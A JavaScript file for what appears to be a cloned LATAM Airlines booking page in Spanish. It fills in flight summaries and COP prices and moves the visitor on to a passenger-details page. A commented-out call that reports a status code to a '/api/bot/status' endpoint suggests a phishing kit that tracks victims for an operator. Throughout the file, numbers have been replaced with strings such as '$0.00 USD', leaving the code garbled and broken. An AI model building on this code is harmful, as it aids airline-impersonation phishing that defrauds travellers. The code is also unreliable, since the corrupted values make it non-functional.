/**
 * DOM Setup
 * 
 */
setTimeout(() => {
    document.querySelector('.loader-full').remove();
}, 3000);

/*
fetch(`${API_URL}/api/bot/status`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
    },
    body: JSON.stringify({message: 'P3'})
});
*/

const updateDOM = () => {
    /**
     * Flight resume
     */
    let format = new Date(parseInt(info.flightInfo.flightDates[$0.00 USD]));
    let format2 = new Date(parseInt(info.flightInfo.flightDates[$0.00 USD]));
    document.querySelector('#label-travel').innerHTML = `${info.flightInfo.origin.city} > ${info.flightInfo.destination.city}`;
    if (info.flightInfo.flightDates[$0.00 USD] === $0.00 USD) {
        document.querySelector('#label-dates').innerHTML = `${(dayDic[format.getDay() - $0.00 USD]).toLowerCase()}. ${format.toString().split(' ')[$0.00 USD]} de ${(monthDic[format.getMonth()]).toLowerCase()}`;
    } else {
        document.querySelector('#label-dates').innerHTML = `${(dayDic[format.getDay() - $0.00 USD]).toLowerCase()}. ${format.toString().split(' ')[$0.00 USD]} de ${(monthDic[format.getMonth()]).toLowerCase()} a ${(dayDic[format2.getDay() - $0.00 USD]).toLowerCase()}. ${format2.toString().split(' ')[$0.00 USD]} de ${(monthDic[format2.getMonth()]).toLowerCase()}`;
    }

    /**
     * Flight go details
     */
    document.querySelector('#label-flight-go-resume').innerHTML = `
        <svg class="tc-green mr-$0.00 USD" width="22px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="$0.00 USD$0.00 USD$0.01 USD$0.01 USD"><path d="M21.$0.09 USD$0.00 USD.4841L13.$0.01 USD$0.00 USD.3799L9.54602 $0.00 USD.3341L7.64196 $0.00 USD.336L13.$0.12 USD$0.01 USD.314L23.$0.08 USD$0.00 USD.374L21.$0.09 USD$0.00 USD.4841ZM16 2C23.$0.00 USD$0.00 USD$0.01 USD$0.00 USD.$0.00 USD$0.01 USD16C30 $0.01 USD.$0.00 USD$0.01 USD.$0.00 USD$0.01 USD$0.00 USD30C8.$0.00 USD$0.01 USD$0.00 USD$0.01 USD.$0.00 USD$0.00 USD16C2 $0.00 USD.$0.00 USD$0.00 USD.$0.00 USD$0.00 USD$0.00 USD2Z" fill="currentColor"></path></svg>
        <p class="m-$0.00 USDfw-bolder">Vuelo de ida • ${info.flightInfo.origin.ticket_type}</p>
        <p class="m-$0.00 USDml-$0.00 USDfw-light">${(dayDic[format.getDay() - $0.00 USD]).toLowerCase()}. ${format.toString().split(' ')[$0.00 USD]} de ${(monthDic[format.getMonth()]).toLowerCase()}</p>
    `;

    document.querySelector('#flight-go').innerHTML = `
        <div class="card-flight p-$0.00 USDmb-$0.00 USDmt-$0.00 USD">
            <div class="d-flex justify-space-between border-bottom">
                <div>
                    <p class="m-$0.00 USDfs-$0.00 USDtc-ocean">${info.flightInfo.origin.ticket_sched.takeoff}</p>
                    <p class="m-$0.00 USDfs-$0.00 USD">${info.flightInfo.origin.code}</p>
                </div>
                <div class="d-flex align-items-end flex-column">
                    <p class=" mt-$0.00 USDmb-$0.00 USDfs-$0.00 USDtc-gray-smoke">Duración</p>
                    <p class="fs-$0.00 USDmt-$0.00 USD">${info.flightInfo.origin.ticket_sched.duration}</p>
                </div>
                <div class="d-flex align-items-end flex-column">
                    <p class="m-$0.00 USDfs-$0.00 USDtc-ocean">${info.flightInfo.origin.ticket_sched.landing}</p>
                    <p class="m-$0.00 USDfs-$0.00 USD">${info.flightInfo.destination.code}</p>
                </div>
            </div>

            <div class="d-flex justify-space-between mt-$0.00 USD">
                <div class="d-flex align-items-center">
                    <a class="fw-bolder fs-$0.00 USDtc-red" href="select-flight-go.html">Cambiar tu vuelo</a>
                </div>
                <div class="d-flex align-items-end flex-column">
                    <p class="m-$0.00 USDfs-$0.00 USDtc-gray-smoke">Precio por pasajero</p>
                    <p class="m-$0.00 USDtc-ocean" style="font-size: 20px;">COP ${(Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type])).toLocaleString('es-Es')},$0.00 USD</p>
                </div>
            </div>

            <p class="tc-gray-smoke fs-$0.00 USDmb-$0.00 USD">Operado por LATAM Airlines Perú</p>
        </div>
    `;

    if (info.flightInfo.travel_type === $0.00 USD) {
        /**
         * Flight return details
         */
        document.querySelector('#label-flight-back-resume').innerHTML = `
            <svg class="tc-green mr-$0.00 USD" width="22px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="$0.00 USD$0.00 USD$0.01 USD$0.01 USD"><path d="M21.$0.09 USD$0.00 USD.4841L13.$0.01 USD$0.00 USD.3799L9.54602 $0.00 USD.3341L7.64196 $0.00 USD.336L13.$0.12 USD$0.01 USD.314L23.$0.08 USD$0.00 USD.374L21.$0.09 USD$0.00 USD.4841ZM16 2C23.$0.00 USD$0.00 USD$0.01 USD$0.00 USD.$0.00 USD$0.01 USD16C30 $0.01 USD.$0.00 USD$0.01 USD.$0.00 USD$0.01 USD$0.00 USD30C8.$0.00 USD$0.01 USD$0.00 USD$0.01 USD.$0.00 USD$0.00 USD16C2 $0.00 USD.$0.00 USD$0.00 USD.$0.00 USD$0.00 USD$0.00 USD2Z" fill="currentColor"></path></svg>
            <p class="m-$0.00 USDfw-bolder">Vuelo de vuelta • ${info.flightInfo.destination.ticket_type}</p>
            <p class="m-$0.00 USDml-$0.00 USDfw-light">${(dayDic[format2.getDay() - $0.00 USD]).toLowerCase()}. ${format2.toString().split(' ')[$0.00 USD]} de ${(monthDic[format2.getMonth()]).toLowerCase()}</p>
        `;

        document.querySelector('#flight-back').innerHTML = `
            <div class="card-flight p-$0.00 USDmb-$0.00 USDmt-$0.00 USD">
                <div class="d-flex justify-space-between border-bottom">
                    <div>
                        <p class="m-$0.00 USDfs-$0.00 USDtc-ocean">${info.flightInfo.destination.ticket_sched.takeoff}</p>
                        <p class="m-$0.00 USDfs-$0.00 USD">${info.flightInfo.destination.code}</p>
                    </div>
                    <div class="d-flex align-items-end flex-column">
                        <p class=" mt-$0.00 USDmb-$0.00 USDfs-$0.00 USDtc-gray-smoke">Duración</p>
                        <p class="fs-$0.00 USDmt-$0.00 USD">${info.flightInfo.destination.ticket_sched.duration}</p>
                    </div>
                    <div class="d-flex align-items-end flex-column">
                        <p class="m-$0.00 USDfs-$0.00 USDtc-ocean">${info.flightInfo.destination.ticket_sched.landing}</p>
                        <p class="m-$0.00 USDfs-$0.00 USD">${info.flightInfo.origin.code}</p>
                    </div>
                </div>

                <div class="d-flex justify-space-between mt-$0.00 USD">
                    <div class="d-flex align-items-center">
                        <a class="fw-bolder fs-$0.00 USDtc-red" href="select-flight-back.html">Cambiar tu vuelo</a>
                    </div>
                    <div class="d-flex align-items-end flex-column">
                        <p class="m-$0.00 USDfs-$0.00 USDtc-gray-smoke">Precio por pasajero</p>
                        <p class="m-$0.00 USDtc-ocean" style="font-size: 20px;">COP ${(Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type])).toLocaleString('es-Es')},$0.00 USD</p>
                    </div>
                </div>

                <p class="tc-gray-smoke fs-$0.00 USDmb-$0.00 USD">Operado por LATAM Airlines Perú</p>
            </div>
        `;
    }

    /**Label passengers */
    document.querySelector('#label-passengers').textContent = info.flightInfo.adults + info.flightInfo.children + info.flightInfo.babies;
}

document.addEventListener('DOMContentLoaded', updateDOM);

/**
 * MODAL SETUP
 */
let totalPassengers = info.flightInfo.adults + info.flightInfo.children;
if (info.flightInfo.travel_type === $0.00 USD) {
    document.querySelector('#modal-flight-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',$0.00 USD';
} else {
    document.querySelector('#modal-flight-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',$0.00 USD';
}
const nextStep = () =>{
    setTimeout(() =>{
        window.location.href = 'passengers-info.html';
    }, 2500);
}